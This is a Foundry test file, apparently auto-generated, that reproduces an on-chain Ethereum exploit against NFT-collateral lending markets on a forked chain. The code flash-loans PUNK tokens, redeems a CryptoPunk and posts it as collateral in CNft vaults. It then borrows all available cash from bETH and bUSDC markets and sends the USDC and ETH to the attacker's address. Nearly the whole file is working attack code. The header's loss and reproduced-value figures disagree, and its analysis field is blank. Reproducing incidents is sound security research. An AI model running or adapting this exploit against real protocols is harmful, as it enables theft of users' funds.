// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 1.35K USD
// Attacker : 0xeaaf475db34fb66f098e51cbf0eeeff76f496974
// Attack Contract : 0xc938a1754ffae29fc019a9f38ea73e5d08b2ef5e
// Vulnerable Contract : 0x4d5cab5135271b4f73d5c2071f8a96d4ee5883d3
// Attack Tx : 0x5b9dc05c2636da600a22d13d5a6a01de7ededfec0227df56a5ed1a61e007457a
// Block : 25544680
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 5.62K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant FORK_BLOCK = 25544679;
    uint256 constant TX_TIMESTAMP = 1784198291;
    uint256 constant TX_BLOCK_NUMBER = 25544680;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 2;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareCtorProfit();
        _logBalances("Before exploit");
        _deployAttack();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        _alignAttackNonce();
        attack = new OurAttack();
        require(address(attack) == ATTACK_CONTRACT, "unexpected attack contract");
    }

    function _alignAttackNonce() internal {
        uint64 currentNonce = vm.getNonce(ATTACKER_EOA);
        if (currentNonce < ATTACKER_EOA_TX_NONCE) {
            vm.setNonce(ATTACKER_EOA, ATTACKER_EOA_TX_NONCE);
        }
    }

    function _prepareCtorProfit() internal {
        _prepareProfit(ATTACK_CONTRACT, _expectedChild());
    }

    function _expectedChild() internal pure returns (address) {
        return Addresses.attack_child;
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(attack.attackChild());
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        _expectProfit(Addresses.attack_child, attackChild, Addresses.PUNK, "PUNK", 1);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 2265103647731362189);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 1347024395);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    constructor() payable {
        _deployAttackAttackChildContracts();
        attackChild._prepareAttackChild();
        _decodedCall(address(attackChild), abi.encodeWithSelector(bytes4(0x63d9b770)));
        IERC20Like(Addresses.USDC).balanceOf(Addresses.attacker_eoa);
    }

    function _deployAttackAttackChildContracts() public returns (address) {
        // semantic child contract spec: status=synthesis_ready strategy=source_deploy op=create address=address(attackChild) constructor=0x314dad3e02d1b372a0951c8e0d4d16cd6de9478f|0x314dad3e02d1b372a0951c8e0d4d16cd6de9478f|ek:creation_initcode|ch:0xa94eceea8cdc819c20431600a55e2459d73324375f217eb0d41f8053ae9b8513|entry|entry|len:8668|input:d1e92765c775d7e9|ct:CREATE|dynamic_instantiation runtime_selectors=4 initcode_sha256=0xd1e92765c775d7e993cd84b106f6c5303f401b94f3d2c740b3824bfe2cbebd10 fallback_reasons=none
        attackChild = new AttackChild();
        require(address(attackChild) == 0x314DaD3e02d1B372A0951c8e0d4d16cD6De9478F, "unexpected attack child");
        return address(attackChild);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    function _boundAttack(bytes memory data) internal {
        _decodedCall(address(attackChild), data);
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok, bytes memory out) = target.call(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "attack child dispatch failed");
    }

    bytes32 private constant REPLAY_CALLBACK_3 = keccak256("poc.replay.REPLAY_CALLBACK_3");
    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");
    mapping(bytes32 => bool) private _replayActive;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

contract AttackChild {
    receive() external payable {}

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata callbackData)
        external
        payable
    {
        if (!_replayActive[REPLAY_CALLBACK_3]) {
            _replayActive[REPLAY_CALLBACK_3] = true;
            flashCallback();
            _replayActive[REPLAY_CALLBACK_3] = false;
        }
        bytes memory ret = hex"439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function exploit() external payable {
        _borrowFlash();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata amounts,
        bytes calldata callbackData
    ) external payable {
        if (!_replayActive[REPLAY_CALLBACK_5]) {
            _replayActive[REPLAY_CALLBACK_5] = true;
            _handleFlash();
            _replayActive[REPLAY_CALLBACK_5] = false;
        }
        bytes memory ret = hex"bc197c8100000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function replayProfit() external {
        if (!_settleDone(1, 596)) {
            bool settlementMaterialized = false;
            if (Harness.safeBalance(Addresses.USDC, Addresses.attacker_eoa) >= 1347024395) {
                _markSettle(1, 596); // observed profit settlement already materialized in main replay
                settlementMaterialized = true;
            }
            if (!settlementMaterialized) {
                _markSettle(1, 596);
                uint256 settleAmount = 1347024395;
                IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, settleAmount);
            }
        }
    }

    bytes32 private constant REPLAY_CALLBACK_3 = keccak256("poc.replay.REPLAY_CALLBACK_3");
    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");
    mapping(bytes32 => bool) private _replayActive;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _prepareAttackChild() public payable {}

    function flashCallback() internal {
        flashCallback2();
        flashCallback3();
    }

    function flashCallback2() internal {
        uint256[] memory punkRedeemReturn = IPUNK(Addresses.PUNK).redeem(1, _uintArray0());
        IPunkIndexToAddressLike(Addresses.A_B47E3C_3BBB).punkIndexToAddress(1893);
        IPunkIndexToAddressLike(Addresses.A_B47E3C_3BBB).punkIndexToAddress(1893);
        IOfferPunkForSaleToAddressLike(Addresses.A_B47E3C_3BBB)
            .offerPunkForSaleToAddress(punkRedeemReturn[0], 0, Addresses.CNft_83D3);
        ICNft_83D3(Addresses.CNft_83D3).mint(_uintArray1(punkRedeemReturn[0]), _uintArray1(32));
        ICNft_83D3(Addresses.CNft_83D3).totalBalance(address(this));
        IPunkIndexToAddressLike(Addresses.A_B47E3C_3BBB).punkIndexToAddress(1893);
        IbETH(Addresses.bETH).accrueInterest();
        uint256 bETHGetCashReturn = IbETH(Addresses.bETH).getCash();
        IbETH(Addresses.bETH).borrow(bETHGetCashReturn);
        IbUSDC(Addresses.bUSDC).accrueInterest();
        uint256 bUSDCGetCashReturn = IbUSDC(Addresses.bUSDC).getCash();
        IbUSDC(Addresses.bUSDC).borrow(bUSDCGetCashReturn);
        ICNft_83D3(Addresses.CNft_83D3).redeem(_uintArray1(punkRedeemReturn[0]), _uintArray1(1));
        IPunkIndexToAddressLike(Addresses.A_B47E3C_3BBB).punkIndexToAddress(1893);
        ICNft_83D3(Addresses.CNft_83D3).totalBalance(address(this));
        IPunkIndexToAddressLike(Addresses.A_B47E3C_3BBB).punkIndexToAddress(1893);
        IOfferPunkForSaleToAddressLike(Addresses.A_B47E3C_3BBB)
            .offerPunkForSaleToAddress(punkRedeemReturn[0], 0, Addresses.CNft);
        ICNft(Addresses.CNft).mint(_uintArray1(punkRedeemReturn[0]), _uintArray1(32));
        ICNft(Addresses.CNft).totalBalance(address(this));
        IPunkIndexToAddressLike(Addresses.A_B47E3C_3BBB).punkIndexToAddress(1893);
        IbETH_FEA1(Addresses.bETH_FEA1).accrueInterest();
        uint256 bETHFea1GetCashReturn = IbETH_FEA1(Addresses.bETH_FEA1).getCash();
        IbETH_FEA1(Addresses.bETH_FEA1).borrow(bETHFea1GetCashReturn);
        IbUSDC_AA8D(Addresses.bUSDC_AA8D).accrueInterest();
        uint256 bUSDCAa8dGetCashReturn = IbUSDC_AA8D(Addresses.bUSDC_AA8D).getCash();
        IbUSDC_AA8D(Addresses.bUSDC_AA8D).borrow(bUSDCAa8dGetCashReturn);
        ICNft(Addresses.CNft).redeem(_uintArray1(punkRedeemReturn[0]), _uintArray1(1));
        IPunkIndexToAddressLike(Addresses.A_B47E3C_3BBB).punkIndexToAddress(1893);
        ICNft(Addresses.CNft).totalBalance(address(this));
        IOfferPunkForSaleToAddressLike(Addresses.A_B47E3C_3BBB)
            .offerPunkForSaleToAddress(punkRedeemReturn[0], 0, Addresses.PUNK);
        IPUNK(Addresses.PUNK).mint(_uintArray1(punkRedeemReturn[0]), _uintArray1(1));
        IERC20Like(Addresses.PUNK).balanceOf(address(this));
        uint256[] memory uniswapV2Router02GetAmountsInReturn = IUniswapV2Router02(Addresses.UniswapV2Router02)
            .getAmountsIn(20000000000000001, _addressArray2(Addresses.WETH, Addresses.PUNK));
        IUniswapV2Router02(Addresses.UniswapV2Router02).swapETHForExactTokens{value: 425028737609712807}(
            uniswapV2Router02GetAmountsInReturn[1],
            _addressArray2(Addresses.WETH, Addresses.PUNK),
            address(this),
            1784198291
        );
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.PUNK).balanceOf(address(this));
        uint256 punkApproveAllowance = 1010000000000000000; // value provenance: arg1=1010000000000000000 is covered by prior Addresses.PUNK.balanceOf(address) return=1010000000000000001 with args (address(this))
        IERC20Like(Addresses.PUNK).approve(Addresses.PUNK, punkApproveAllowance);
        uint256 usdcBalanceOfAttackHelper = IERC20Like(Addresses.USDC).balanceOf(address(this));
        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, usdcBalanceOfAttackHelper);
        bool attackerEoaReceiveSucceeded;
        (attackerEoaReceiveSucceeded,) = payable(Addresses.attacker_eoa).call{value: 2265390507464236669}(""); // artifact native value transfer with empty calldata; pseudocode raw_call action_0039 line 712 requires exact artifact calldata
        require(attackerEoaReceiveSucceeded, "observed native receive transfer failed");
    }

    function _borrowFlash() internal {
        IPUNK(Addresses.PUNK).randomRedeemFee();
        IPUNK(Addresses.PUNK)
            .flashLoan(
                address(this),
                Addresses.PUNK,
                1010000000000000000,
                hex"000000000000000000000000eaaf475db34fb66f098e51cbf0eeeff76f496974"
            );
    }

    function _handleFlash() internal {}

    function _handleFlash2() internal {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant CNft = 0x039A3aab5820d1293369EC93109C9e1929A5aF9a; // Addresses.CNft = 0x039a3aab5820d1293369ec93109c9e1929a5af9a label=CNft roles=asset|contract|attack_address|recipient|sender source=etherscan_v2 confidence=high
    address internal constant PUNK = 0x269616D549D7e8Eaa82DFb17028d0B212D11232A; // Addresses.PUNK = 0x269616d549d7e8eaa82dfb17028d0b212d11232a label=BeaconProxy token_symbol=PUNK roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|sender|token_related source=etherscan_v2 confidence=high
    address internal constant bETH = 0x2E35bd135942dD0b303444bEBdCE097d81B9E0f3; // Addresses.bETH = 0x2e35bd135942dd0b303444bebdce097d81b9e0f3 label=CEther token_symbol=bETH roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant attack_child = 0x314DaD3e02d1B372A0951c8e0d4d16cD6De9478F; // Addresses.attack_child = 0x314dad3e02d1b372a0951c8e0d4d16cd6de9478f label=attack_child roles=attacker_callback_contract|attacker_contract|attacker_surface_contract|code_contract|contract|attack_child_contract|economic_holder|localized_contract|attack_address|poc_reconstruction_surface|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant CNft_83D3 = 0x4d5Cab5135271b4F73D5c2071F8a96d4eE5883d3; // Addresses.CNft_83D3 = 0x4d5cab5135271b4f73d5c2071f8a96d4ee5883d3 label=CNft roles=asset|contract|attack_address|recipient|sender source=etherscan_v2 confidence=high
    address internal constant bUSDC = 0x4F81E4fef63cc01FA4Cc97C78F3F08c29fC9bAD1; // Addresses.bUSDC = 0x4f81e4fef63cc01fa4cc97c78f3f08c29fc9bad1 label=CErc20Immutable token_symbol=bUSDC roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant bETH_FEA1 = 0x6d3320EdbB6689248DedAEbf5A21a738d28efea1; // Addresses.bETH_FEA1 = 0x6d3320edbb6689248dedaebf5a21a738d28efea1 label=CEther token_symbol=bETH roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // Addresses.USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 label=FiatTokenProxy token_symbol=USDC roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant A_B47E3C_3BBB = 0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB; // Addresses.A_B47E3C_3BBB = 0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb label=CryptoPunksMarket token_symbol=Ͼ roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // Addresses.WETH = 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 label=WETH9 token_symbol=WETH roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant attack_path_entry = 0xC938A1754Ffae29fC019a9f38Ea73E5D08B2eF5E; // Addresses.attack_path_entry = 0xc938a1754ffae29fc019a9f38ea73e5d08b2ef5e label=attack_path_entry roles=attack_path_entry_contract|attacker_contract|code_contract|contract|poc_reconstruction_surface|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant bUSDC_AA8D = 0xd3cCF33CAed01a0Cc2b34B27A77F41f92604Aa8d; // Addresses.bUSDC_AA8D = 0xd3ccf33caed01a0cc2b34b27a77f41f92604aa8d label=CErc20Immutable token_symbol=bUSDC roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant UniswapV2Router02 = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F; // Addresses.UniswapV2Router02 = 0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f label=UniswapV2Router02 roles=code_contract|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant attacker_eoa = 0xeAAF475Db34fB66F098e51cBF0EEEff76f496974; // Addresses.attacker_eoa = 0xeaaf475db34fb66f098e51cbf0eeeff76f496974 label=attacker_eoa roles=attacker_eoa|code_contract|contract|economic_holder|attack_address|profit_holder|recipient|sender|storage_contract source=tx_metadata.from confidence=high
}

interface ICNft {
    function mint(uint256[] calldata, uint256[] calldata) external returns (uint256);
    function redeem(uint256[] calldata, uint256[] calldata) external;
    function totalBalance(address) external view returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface ICNft_83D3 {
    function mint(uint256[] calldata, uint256[] calldata) external returns (uint256);
    function redeem(uint256[] calldata, uint256[] calldata) external;
    function totalBalance(address) external view returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface IOfferPunkForSaleToAddressLike {
    function offerPunkForSaleToAddress(uint256, uint256, address) external;
}

interface IPUNK {
    function flashLoan(address, address, uint256, bytes calldata) external returns (uint256);
    function mint(uint256[] calldata, uint256[] calldata) external returns (uint256);
    function randomRedeemFee() external view returns (uint256);
    function redeem(uint256, uint256[] calldata) external returns (uint256[] memory);
    function mint(address to) external returns (uint256 liquidity);
}

interface IPunkIndexToAddressLike {
    function punkIndexToAddress(uint256) external view returns (uint256);
}

interface IUniswapV2Router02 {
    function getAmountsIn(uint256, address[] calldata) external view returns (uint256[] memory);
    function swapETHForExactTokens(uint256, address[] calldata, address, uint256)
        external
        payable
        returns (uint256[] memory);
}

interface IbETH {
    function accrueInterest() external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface IbETH_FEA1 {
    function accrueInterest() external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface IbUSDC {
    function accrueInterest() external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface IbUSDC_AA8D {
    function accrueInterest() external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function getCash() external view returns (uint256);
}

interface Iattack_child {
    function exploit() external;
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
